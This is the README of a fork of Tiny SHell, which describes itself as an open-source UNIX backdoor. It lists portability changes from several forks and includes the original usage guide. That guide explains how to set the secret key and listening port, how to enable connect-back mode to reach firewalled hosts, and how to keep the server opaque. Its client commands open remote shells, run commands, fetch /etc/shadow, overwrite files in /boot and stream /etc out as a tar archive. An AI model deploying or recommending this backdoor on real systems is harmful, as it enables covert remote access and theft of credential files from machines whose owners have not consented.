## Tiny SHell - An open-source UNIX backdoor, written by Christophe Devine, which enhancements and utilities from others

Christophe Devine released this tool licensed under 'the GPL' though he did not specify which version

This fork, licensed by copyright@mzpqnxow.com, is released under the GPLv2. See LICENSE and LICENSE.md for more information on this license


### https://github.com/mzpqnxow/tsh fork

This is a fork of the fork by creaktive with a focus on portability and convenience

  * Added splice_secret.sh to hotpatch existing binaries with new secrets, useful for deploying statically linked binaries with obscure toolchains that are painful to rebuild, and when it's not secure to use the same password for all instances of tshd (if you're using it on 2 security domains)
  * Restored the portability feature of defaulting to /bin/sh (busybox, AIX, HP-UX, IRIX, many Solaris need this)
  * Restored the more 'old school' way of the server, not accepting any arguments and being fairly opaque about what it even is (just minimal obfuscation)
  * Added simple way to avoid using a login shell at all (via ```MINIMAL=1 ./tsh```)
  * Added a way to explicitly specify Bash if you really want to (via ```BASH=1 ./tsh```)
  * Since creaktive's default of using /bin/bash was removed in my fork, it caused Debian derived systems to break since dash doesn't handle --login, fixed using /bin/sh -l (via ```DASH=1 ./tsh```)

#### TODO
  * Add a collection of statically built (w/musl libc) executables for MIPS and ARM variants
  * Add a tool to hotpatch a hardcoded port and/or connectback host/IP into a tshd binary


### https://github.com/creaktive/tsh fork
  * Added iPhone buildability and a usage function
  * Redid the Makefile
  * Upgraded the ciphers
  * Added some argv[] handling
  * Maybe some other stuff?
  * Does not add any new licensing terms

### Original tsh version 0.6

```
                 Tiny SHell - An open-source UNIX backdoor


    Before compiling Tiny SHell

        1. First of all, you should setup your secret key, which
           is located in tsh.h; the key can be of any length (use
           at least 12 characters for better security).

        2. It is advised to change SERVER_PORT, the port on which
           the server will be listening for incoming connections.

        3. You may want to start tshd in "connect-back" mode if
           it runs on on a firewalled box; simply uncomment and
           modify CONNECT_BACK_HOST in tsh.h.

    * Compiling Tiny SHell

        Run "make <system>", where <system> can be any one of these:
        linux, freebsd, openbsd, netbsd, cygwin, sunos, irix, hpux, osf

    * How to use the server

        It can be useful to set $HOME and the file creation mask
        before starting the server:

            % umask 077; HOME=/var/tmp ./tshd

    * How to use the client

        Make sure tshd is running on the remote host. You can:

        - start a shell:

            ./tsh <hostname>

        - execute a command:

            ./tsh <hostname> "uname -a"

        - transfer files:

            ./tsh <hostname> get /etc/shadow .
            ./tsh <hostname> put vmlinuz /boot

        Note: if the server runs in connect-back mode, replace
        the remote machine hostname with "cb".

    * About multiple file transfers

        At the moment, Tiny SHell does not support scp-like multiple
        and/or recursive file transfers. You can work around this bug
        by simply making a tar archive and transferring it. Example:

        ./tsh host "stty raw; tar -cf - /etc 2>/dev/null" | tar -xvf -

    * About terminal modes

        On some brain-dead systems (actually, IRIX and HP-UX), Ctrl-C
        and other control keys do not work correctly. Fix it with:

            % stty intr "^C" erase "^H" eof "^D" susp "^Z" kill "^U"

    * About security

        Please remember that the secret key is stored in clear inside
        both tsh and tshd executables; therefore you should make sure
        that no one except you has read access to these two files.
        However, you may choose not to store the real (valid) key in
        the client, which will then ask for a password when it starts.
```
